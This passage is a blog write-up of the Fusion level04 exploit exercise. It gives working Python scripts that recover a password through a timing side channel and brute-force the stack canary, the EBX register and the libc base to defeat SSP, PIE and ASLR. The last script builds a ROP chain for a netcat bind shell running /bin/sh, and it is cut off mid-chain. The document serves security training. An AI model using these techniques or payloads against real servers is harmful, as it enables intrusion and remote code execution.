@@ -1,0 +1,949 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Fusion level04 write-up</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="In this level we have to bypass a bunch of protections:
+The stack based vulnerability is easy to find. It is in the base64_decode() function. It takes the output buffer length as an argument, but the it overwrites it with a new value based on the input buffer length. So we are going to be able to control how many bytes we want to write in the output buffer:
+*output_length = input_length / 4 * 3;  Now in order to send a valid request we need to provide a password the server generates when it loads but then it reuses for every connection.">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="Fusion level04 write-up">
+    <meta name="twitter:description" content="In this level we have to bypass a bunch of protections:
+The stack based vulnerability is easy to find. It is in the base64_decode() function. It takes the output buffer length as an argument, but the it overwrites it with a new value based on the input buffer length. So we are going to be able to control how many bytes we want to write in the output buffer:
+*output_length = input_length / 4 * 3;  Now in order to send a valid request we need to provide a password the server generates when it loads but then it reuses for every connection.">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Fusion level04 write-up">
+  <meta property="og:description" content="In this level we have to bypass a bunch of protections:
+The stack based vulnerability is easy to find. It is in the base64_decode() function. It takes the output buffer length as an argument, but the it overwrites it with a new value based on the input buffer length. So we are going to be able to control how many bytes we want to write in the output buffer:
+*output_length = input_length / 4 * 3;  Now in order to send a valid request we need to provide a password the server generates when it loads but then it reuses for every connection.">
+  <meta property="og:url" content="http://pwntester.com/blog/2013/12/31/fusion-level04-write-up/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2013/12/31/fusion-level04-write-up/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Fusion level04 write-up</h1>
+      <p class="post-meta">@pwntester · Dec 31, 2013 · 17 min read</p>
+    </header>
+    <article class="post-content"><p>In this <a href="http://exploit-exercises.com/fusion/level04">level</a> we have to bypass a bunch of protections:</p>
+
+<p><img src="/images/octopress/fusion04.png" alt="" /></p>
+
+<p>The stack based vulnerability is easy to find. It is in the <strong>base64_decode()</strong> function. It takes the output buffer length as an argument, but the it overwrites it with a new value based on the input buffer length. So we are going to be able to control how many bytes we want to write in the output buffer:</p>
+
+<pre><code class="language-lang-clike">*output_length = input_length / 4 * 3;
+</code></pre>
+
+<p>Now in order to send a valid request we need to provide a password the server generates when it loads but then it reuses for every connection. There is a covert channel leaking how many characters we sent were wrong and we can take advantage of this to get the password. The following script will choose a character based on the response time till it finds the 16 character long password:</p>
+
+<pre><code class="language-lang-python">#!/usr/bin/python
+
+from socket import *
+from struct import *
+import base64
+import time
+import string
+
+
+def try_password(password):
+        credentials = base64.b64encode(&quot;stack6:{0}&quot;.format(password))
+        s = socket(AF_INET, SOCK_STREAM)
+        s.connect((&quot;localhost&quot;, 20004))
+        request = &quot;GET / HTTP/1.0\r\n&quot;
+        request += &quot;Authorization: Basic {0}\r\n&quot;.format(credentials)
+        request += &quot;\n&quot;
+        begin = time.time()
+        s.send(request)
+        response = s.recv(1024)
+        end = time.time()
+        s.close()
+        return (end-begin, response)
+
+def bruteforce():
+        password = &quot;&quot;
+        count = 3
+        i = 0
+        while i&lt;16:
+                candidate = &quot;&quot;
+                others = 10000000
+                response = &quot;&quot;
+                for char in string.ascii_letters+string.digits:
+                        (time, response) = try_password(password + char)
+                        #print(&quot;trying {0}, reponse in {1}&quot;.format(char, time))
+                        if &quot;Unauthorized&quot; not in response:
+                                print(&quot;Eureka &quot; + password + char)
+                                return password + char
+                        else:
+                                if time &lt; others:
+                                        candidate = char
+                                        others = time
+                password += candidate
+                print(password)
+                i += 1
+passwd = bruteforce()
+</code></pre>
+
+<p>If we run it we will get the passord:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~$ python fusion04.py
+B
+B0
+B0f
+B0fN
+B0fNG
+B0fNGX
+B0fNGXy
+B0fNGXyn
+B0fNGXynX
+B0fNGXynX8
+B0fNGXynX8i
+B0fNGXynX8io
+B0fNGXynX8io6
+B0fNGXynX8io6G
+B0fNGXynX8io6GN
+Eureka B0fNGXynX8io6GNO
+</code></pre>
+
+<p>Ok, now we need to smash the stack but there is a canary (SSP) guarding it so we need a way to find out the right canary.</p>
+
+<p>When a server program calls &ldquo;fork()&rdquo; to handle a client request but it does not call &ldquo;execve()&rdquo; the address space for the child processes will be exactly the same as its parents so the same &ldquo;canary&rdquo; value will be reused for every client request.</p>
+
+<p>Fortunately for us, the application will let us know when the canary is wrong or right. Lets just overflow the canary and EIP to verify it:</p>
+
+<pre><code class="language-lang-python">credentials = base64.b64encode(&quot;stack6:{0}&quot;.format(passwd))
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((&quot;localhost&quot;, 20004))
+request = &quot;GET / HTTP/1.0\r\n&quot;
+request += &quot;Authorization: Basic {0}\r\n&quot;.format(credentials + &quot;A&quot;*4096 + &quot;DDDD&quot; + &quot;CCCC&quot;)
+request += &quot;\n&quot;
+s.send(request)
+response = s.recv(1024)
+print(response)
+s.close()
+</code></pre>
+
+<p>And the application kindly let us know that the canary was wrong:</p>
+
+<pre><code class="language-lang-python">fusion@fusion:~$ python fusion04.py
+Eureka B0fNGXynX8io6GNO
+HTTP/1.0 200 Ok
+
+*** stack smashing detected ***: /opt/fusion/bin/level04 terminated
+</code></pre>
+
+<p>So we can brute force the canary but first we need to find the canary and EIP offsets:</p>
+
+<pre><code class="language-lang-python">canary_offset = 2500
+while True:
+        credentials = base64.b64encode(&quot;stack6:{0}&quot;.format(passwd))
+        s = socket(AF_INET, SOCK_STREAM)
+        s.connect((&quot;localhost&quot;, 20004))
+        request = &quot;GET / HTTP/1.0\r\n&quot;
+        request += &quot;Authorization: Basic {0}\r\n&quot;.format(credentials + &quot;A&quot;*canary_offset )
+        request += &quot;\n&quot;
+        s.send(request)
+        response = s.recv(1024)
+        s.close()
+        if &quot;smashing&quot; in response:
+                print(&quot;[+] Server response &quot; + response)
+                print(&quot;[+] Canary offset: &quot; + str(canary_offset))
+                break
+        canary_offset += 1
+</code></pre>
+
+<p>We find that the canary offset is 2704:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~$ python fusion04.py
+[+] Brute forcing password ...
+[+] Eureka B0fNGXynX8io6GNO
+[+] Searching Canary offset ...
+[+] Server response *** stack smashing detected ***: /opt/fusion/bin/level04 terminated
+[+] Canary offset: 2704
+</code></pre>
+
+<p>Ok, now we will overwrite the canary one byte at a time until we dont get the &ldquo;stack smashing detected&rdquo; message:</p>
+
+<pre><code class="language-lang-python">canary_offset = 2500
+while True:
+        credentials = base64.b64encode(&quot;stack6:{0}&quot;.format(passwd))
+        s = socket(AF_INET, SOCK_STREAM)
+        s.connect((&quot;localhost&quot;, 20004))
+        request = &quot;GET / HTTP/1.0\r\n&quot;
+        request += &quot;Authorization: Basic {0}\r\n&quot;.format(credentials + &quot;A&quot;*canary_offset )
+        request += &quot;\n&quot;
+        s.send(request)
+        response = s.recv(1024)
+        s.close()
+        if &quot;smashing&quot; in response:
+                print(&quot;[+] Server response &quot; + response)
+                print(&quot;[+] Canary offset: &quot; + str(canary_offset))
+                break
+        canary_offset += 1
+</code></pre>
+
+<p>We find that the canary offset is 2704:</p>
+
+<pre><code class="language-lang-python">print(&quot;[+] Bruteforcing Canary ...&quot;)
+canary = &quot;&quot;
+for byte in xrange(4):
+        for canary_byte in xrange(256):
+                hex_byte = chr(canary_byte)
+                #print(&quot;[+] Trying: {0}{1}&quot;.format(canary.encode(&quot;hex&quot;), hex_byte.encode(&quot;hex&quot;)))
+                credentials = base64.b64encode(&quot;stack6:{0}&quot;.format(passwd + &quot;A&quot;*canary_offset + canary + hex_byte))
+                s = socket(AF_INET, SOCK_STREAM)
+                s.connect((&quot;localhost&quot;, 20004))
+                request = &quot;GET / HTTP/1.0\r\n&quot;
+                request += &quot;Authorization: Basic {0}\r\n&quot;.format(credentials)
+                request += &quot;\n&quot;
+                s.send(request)
+                response = s.recv(1024)
+                s.close()
+                if &quot;smashing&quot; not in response:
+                        canary += hex_byte
+                        print(&quot;[+] Found canary byte: &quot; + hex(canary_byte))
+                        break
+print(&quot;[+] Canary found: &quot; + canary.encode(&quot;hex&quot;))
+</code></pre>
+
+<p>Now that we know the SSP canary, we need to know the EIP offset that turns out to be 28 from the canary:</p>
+
+<pre><code class="language-lang-bash">passwd + &quot;A&quot;*canary_offset + canary + &quot;B&quot;*28 + &quot;DDDD&quot;
+</code></pre>
+
+<p>In gdb:</p>
+
+<pre><code class="language-lang-bash">(gdb) c
+Continuing.
+[New process 21459]
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 21459]
+0x44444444 in ?? ()
+</code></pre>
+
+<p>Also in [PIE]() binaries, the compiler compile the binary as a Position Independent Code (PIC) meaning that it can be run in any memory position. In order to do that, the code needs to remember the offset where the binary has been loaded. Compiler will use <strong>ebx</strong> for this. It will contain the binary load base plus an unknow offset: ebx = load base + offset</p>
+
+<p>The compiler will pop ebx in the function epilogue to pass it to following calls. So if we overwrite the stack dword where <strong>ebx</strong> is popped from, we will confuse the binary and the result will be unpredictable since it wont be able to find the binary load base.</p>
+
+<p>Function epilogue in PIE binaries:</p>
+
+<pre><code class="language-lang-bash">(gdb) disas validate_credentials
+...
+0xb785f2b5 &lt;+357&gt;:	pop    %ebx
+0xb785f2b6 &lt;+358&gt;:	pop    %esi
+0xb785f2b7 &lt;+359&gt;:	pop    %edi
+0xb785f2b8 &lt;+360&gt;:	pop    %ebp
+0xb785f2b9 &lt;+361&gt;:	ret
+...
+</code></pre>
+
+<p>We need to preserve <strong>ebx</strong> so we need to find out its value and we will use the same brute forcing approach but first we need to know the offset of the value that we will pop into ebx in our payload.</p>
+
+<pre><code class="language-lang-bash">passwd + &quot;A&quot;*canary_offset + canary + &quot;B&quot;*12 + &quot;CCCC&quot; + &quot;B&quot;*12 + &quot;DDDD&quot;
+</code></pre>
+
+<p>In gdb:</p>
+
+<pre><code class="language-lang-bash">(gdb) c
+Continuing.
+[New process 22843]
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 22843]
+0x44444444 in ?? ()
+(gdb) i r ebx
+ebx            0x43434343	1128481603
+</code></pre>
+
+<p>Ok now we can bruteforce <strong>ebx</strong> with the following script:</p>
+
+<pre><code class="language-lang-python">print(&quot;[+] Bruteforcing EBX ...&quot;)
+ebx = &quot;&quot;
+for byte in xrange(4):
+        for ebx_byte in xrange(256):
+                hex_byte = chr(ebx_byte)
+                #print(&quot;[+] Trying: {0}{1}&quot;.format(ebx.encode(&quot;hex&quot;), hex_byte.encode(&quot;hex&quot;)))
+                credentials = base64.b64encode(&quot;stack6:{0}&quot;.format(passwd + &quot;A&quot;*canary_offset + canary + &quot;B&quot;*12 + ebx + hex_byte))
+                try:
+                        s = socket(AF_INET, SOCK_STREAM)
+                        s.connect((&quot;localhost&quot;, 20004))
+                        request = &quot;GET / HTTP/1.0\r\n&quot;
+                        request += &quot;Authorization: Basic {0}\r\n&quot;.format(credentials)
+                        request += &quot;\n&quot;
+                        s.send(request)
+                        response = s.recv(1024)
+                        s.close()
+                        if &quot;200&quot; in response:
+                                ebx += hex_byte
+                                print(&quot;[+] Found EBX byte: &quot; + hex(ebx_byte))
+                                break
+                except:
+                        pass
+print(&quot;[+] EBX found: &quot; + ebx.encode(&quot;hex&quot;))
+</code></pre>
+
+<p>Script output:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~$ python fusion04.py
+[+] Bruteforcing password ...
+[+] Eureka W5AbnpNbWfM1586i
+[+] Validating password ...
+[+] Server response HTTP/1.0 200 Ok
+[+] Searching Canary offset. Starting with 2000 ...
+[+] Server response *** stack smashing detected ***: /opt/fusion/bin/level04 terminated
+[+] Canary offset: 2026
+[+] Bruteforcing Canary ...
+[+] Found canary byte: 0x0
+[+] Found canary byte: 0xce
+[+] Found canary byte: 0x76
+[+] Found canary byte: 0x13
+[+] Canary found: 00ce7613
+[+] Bruteforcing EBX ...
+[+] Found EBX byte: 0x18
+[+] Found EBX byte: 0x11
+[+] Found EBX byte: 0x86
+[+] Found EBX byte: 0xb7
+[+] EBX found: 181186b7
+</code></pre>
+
+<p>Now that we know <strong>ebx</strong> we need to find out the binary load base. We said that ebx = base + offset. Lets use gdb to fid out the value of this offset:</p>
+
+<pre><code class="language-lang-bash">(gdb) info proc stat
+...
+Start of text: 0xb785d000
+End of text: 0xb7860ad0
+Start of stack: 0xbfca0dd0
+</code></pre>
+
+<p>offset = ebx - 0xb785d000</p>
+
+<p>In our previous run ebx was 0xb7861118 so offset is 0x4118:</p>
+
+<pre><code class="language-lang-bash">(gdb) i r $ebx
+ebx            0xb7861118
+(gdb) p /x $ebx-0x4118
+$1 = 0xb785d000
+</code></pre>
+
+<p>Now kill the server and restart it so that we can run the exploit again and verify that our leaked <strong>ebx</strong> - <strong>0x4118</strong> points to .text:</p>
+
+<pre><code class="language-lang-bash">(gdb) i r $ebx
+ebx            0xb77a9118
+(gdb) p /x $ebx-0x4118
+$2 = 0xb77a5000
+(gdb) info proc stat
+...
+...
+Start of text: 0xb77a5000
+End of text: 0xb77a8ad0
+Start of stack: 0xbfecd200
+</code></pre>
+
+<p>Nice! We now know the offset where the binary is loaded so we need to weaponize our exploit</p>
+
+<p>My first idea was to use the same technique used in level03: modify GOT entry and then use ret2plt. The problem is that there are no enough gadgets in the binary to modify the GOT reference. Actually, the number of gadgets in our binary is a little depressing :(</p>
+
+<pre><code class="language-lang-bash">ROPeMe&gt; generate /opt/fusion/bin/level04
+Generating gadgets for /opt/fusion/bin/level04 with backward depth=3
+It may take few minutes depends on the depth and file size...
+Processing code block 1/1
+Generated 86 gadgets
+</code></pre>
+
+<p>Next idea is to use gadgets from <strong>libc</strong> but since the server is using ASLR, we need to somehow leak the libc base address with the help of our recently leaked binary load address or brute force it. I will be using the later as I did for <a href="http://www.pwntester.com/blog/2013/12/30/fusion-level02-write-up/">level02</a></p>
+
+<p>Note: For the brute force, leaking the binary load address was not required but I tried not to use libc :(</p>
+
+<p>Ok, the whole exploit reusing the ROP chain built for <a href="http://www.pwntester.com/blog/2013/12/30/fusion-level02-write-up/">level02</a> looks like:</p>
+
+<pre><code class="language-lang-bash">#!/usr/bin/python
+
+from socket import *
+from struct import *
+import base64
+import time
+import string
+
+def try_password(password):
+	credentials = base64.b64encode(&quot;stack6:{0}&quot;.format(password))
+	s = socket(AF_INET, SOCK_STREAM)
+	s.connect((&quot;localhost&quot;, 20004))
+	request = &quot;GET / HTTP/1.0\r\n&quot;
+	request += &quot;Authorization: Basic {0}\r\n&quot;.format(credentials)
+	request += &quot;\n&quot;
+	begin = time.time()
+	s.send(request)
+	response = s.recv(1024)
+	end = time.time()
+	s.close()
+	return (end-begin, response)
+
+def bruteforce():
+	password = &quot;&quot;
+	count = 3
+	i = 0
+	while i&lt;16:
+		candidate = &quot;&quot;
+		others = 10000000
+		response = &quot;&quot;
+		for char in string.ascii_letters+string.digits:
+			(time, response) = try_password(password + char)
+			#print(&quot;trying {0}, reponse in {1}&quot;.format(char, time))
+			if &quot;Unauthorized&quot; not in response:
+				print(&quot;[+] Eureka &quot; + password + char)
+				return password + char
+			else:
+				if time &lt; others:
+					candidate = char
+					others = time
+		password += candidate
+		#print(password)
+		i += 1
+
+print(&quot;[+] Bruteforcing password ...&quot;)
+passwd = bruteforce()
+
+print(&quot;[+] Validating password ...&quot;)
+credentials = base64.b64encode(&quot;stack6:{0}&quot;.format(passwd))
+s = socket(AF_INET, SOCK_STREAM)
+s.connect((&quot;localhost&quot;, 20004))
+request = &quot;GET / HTTP/1.0\r\n&quot;
+request += &quot;Authorization: Basic {0}\r\n&quot;.format(credentials)
+request += &quot;\n&quot;
+s.send(request)
+response = s.recv(1024)
+print(&quot;[+] Server response &quot; + response.replace(&quot;\n&quot;,&quot;&quot;))
+s.close()
+
+canary_offset = 2000
+print(&quot;[+] Searching Canary offset. Starting with {0} ...&quot;.format(canary_offset))
+while True:
+	s = socket(AF_INET, SOCK_STREAM)
+	s.connect((&quot;localhost&quot;, 20004))
+	credentials = base64.b64encode(&quot;stack6:{0}&quot;.format(passwd + &quot;A&quot;*canary_offset))
+	request = &quot;GET / HTTP/1.0\r\n&quot;
+	request += &quot;Authorization: Basic {0}\r\n&quot;.format(credentials)
+	request += &quot;\n&quot;
+	s.send(request)
+	response = s.recv(1024)
+	s.close()
+	if &quot;smashing&quot; in response:
+		print(&quot;[+] Server response &quot; + response.replace(&quot;\n&quot;, &quot;&quot;))
+		print(&quot;[+] Canary offset: &quot; + str(canary_offset))
+		canary_offset -= 1
+		break
+	canary_offset += 1
+
+print(&quot;[+] Bruteforcing Canary ...&quot;)
+canary = &quot;&quot;
+for byte in xrange(4):
+	for canary_byte in xrange(256):
+		hex_byte = chr(canary_byte)
+		#print(&quot;[+] Trying: {0}{1}&quot;.format(canary.encode(&quot;hex&quot;), hex_byte.encode(&quot;hex&quot;)))
+		credentials = base64.b64encode(&quot;stack6:{0}&quot;.format(passwd + &quot;A&quot;*canary_offset + canary + hex_byte))
+		s = socket(AF_INET, SOCK_STREAM)
+		s.connect((&quot;localhost&quot;, 20004))
+		request = &quot;GET / HTTP/1.0\r\n&quot;
+		request += &quot;Authorization: Basic {0}\r\n&quot;.format(credentials)
+		request += &quot;\n&quot;
+		s.send(request)
+		response = s.recv(1024)
+		s.close()
+		if &quot;smashing&quot; not in response:
+			canary += hex_byte
+			print(&quot;[+] Found canary byte: &quot; + hex(canary_byte))
+			break
+print(&quot;[+] Canary found: &quot; + canary.encode(&quot;hex&quot;))
+
+print(&quot;[+] Bruteforcing EBX ...&quot;)
+ebx = &quot;&quot;
+for byte in xrange(4):
+	for ebx_byte in xrange(256):
+		hex_byte = chr(ebx_byte)
+		#print(&quot;[+] Trying: {0}{1}&quot;.format(ebx.encode(&quot;hex&quot;), hex_byte.encode(&quot;hex&quot;)))
+		credentials = base64.b64encode(&quot;stack6:{0}&quot;.format(passwd + &quot;A&quot;*canary_offset + canary + &quot;B&quot;*12 + ebx + hex_byte))
+		try:
+			s = socket(AF_INET, SOCK_STREAM)
+			s.connect((&quot;localhost&quot;, 20004))
+			request = &quot;GET / HTTP/1.0\r\n&quot;
+			request += &quot;Authorization: Basic {0}\r\n&quot;.format(credentials)
+			request += &quot;\n&quot;
+			s.send(request)
+			response = s.recv(1024)
+			s.close()
+			if &quot;200&quot; in response:
+				ebx += hex_byte
+				print(&quot;[+] Found EBX byte: &quot; + hex(ebx_byte))
+				break
+		except:
+			pass
+print(&quot;[+] EBX found: &quot; + ebx.encode(&quot;hex&quot;))
+base = unpack(&quot;&lt;I&quot;, ebx)[0] - 0x4118
+print(&quot;[+] Binary loaded at address: {0}&quot;.format(hex(base)))
+
+
+print(&quot;[+] Bruteforcing libc base address&quot;)
+for off in range(0xb7000000, 0xb8000000, 0x1000):
+        p = ''
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789c0) # @ .data
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000238df) # pop eax ; ret
+        p += &quot;////&quot; # /usr
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789c4) # @ .data + 4
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000238df) # pop eax ; ret
+        p += &quot;/bin&quot; # /bin
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789c8) # @ .data + 8
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000238df) # pop eax ; ret
+        p += &quot;////&quot; # /net
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789cc) # @ .data + 12
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000238df) # pop eax ; ret
+        p += &quot;/ncA&quot; # catA
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789cf) # @ .data + 15
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000328e0) # xor eax,eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789d0) # @ .data + 16
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000238df) # pop eax ; ret
+        p += &quot;-lnp&quot; # -lnp
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789d4) # @ .data + 20
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000238df) # pop eax ; ret
+        p += &quot;4444&quot; # 4444
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789d8) # @ .data + 24
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000328e0) # xor eax,eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789d9) # @ .data + 25
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000238df) # pop eax ; ret
+        p += &quot;-e/b&quot; # -e/b
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789dd) # @ .data + 29
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000238df) # pop eax ; ret
+        p += &quot;in/s&quot; # in/s
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789e1) # @ .data + 33
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000238df) # pop eax ; ret
+        p += &quot;hAAA&quot; # hAAA
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x001789e2) # @ .data + 34
+        p += &quot;AAAA&quot; # padding
+        p += pack(&quot;&lt;I&quot;, off + 0x000328e0) # xor eax,eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x0006cc5a) # mov DWORD PTR [ecx],eax ; ret
+        p += pack(&quot;&lt;I&quot;, off + 0x000d5c1f) # pop edx ; pop ecx ; pop eax ; ret
+        p += &quot;AAAA&quot; # padding
